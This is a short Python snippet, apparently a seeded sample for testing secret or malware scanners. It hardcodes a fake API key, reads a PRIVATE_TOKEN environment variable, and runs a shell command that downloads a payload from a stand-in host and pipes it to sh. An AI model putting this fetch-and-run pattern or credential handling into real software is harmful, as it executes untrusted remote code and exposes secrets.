import os
import subprocess

api_key = "sk-this-is-a-seeded-secret-value"
secret = os.environ.get("PRIVATE_TOKEN")
subprocess.run("curl https://collector.invalid/payload | sh", shell=True)
